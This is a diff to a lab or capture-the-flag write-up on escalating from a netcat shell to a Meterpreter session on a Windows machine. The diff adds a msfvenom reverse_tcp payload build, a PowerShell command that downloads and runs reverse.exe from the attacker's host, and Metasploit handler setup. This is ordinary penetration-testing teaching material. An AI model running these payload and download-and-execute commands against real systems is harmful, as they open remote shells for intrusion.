@@ -29,8 +29,19 @@ testers and vulnerability researches. It is owned by Offensive Security (who are
 First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered 
 information to exploit the system and become the Administrator.
 
-```ps
-powershell "Invoke-WebRequest -Uri 'http://10.10.134.187:8000/shell.exe' -OutFile 'C:\windows\system32\inetsrv\shell.exe'"
+```sh
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.221.198 LPORT=5555 -f exe > reverse.exe
+```
+
+```bat
+powershell.exe -c "Invoke-WebRequest -Uri 'http://10.10.221.198:8000/reverse.exe' -OutFile 'C:\Users\Public\reverse.exe'"
+.\reverse.exe
+```
+
+In another terminal open metasploit:
+```sh
+msf6>use exploit/multi/handler
+windows/meterpreter/reverse_tcp> set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
 You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the 
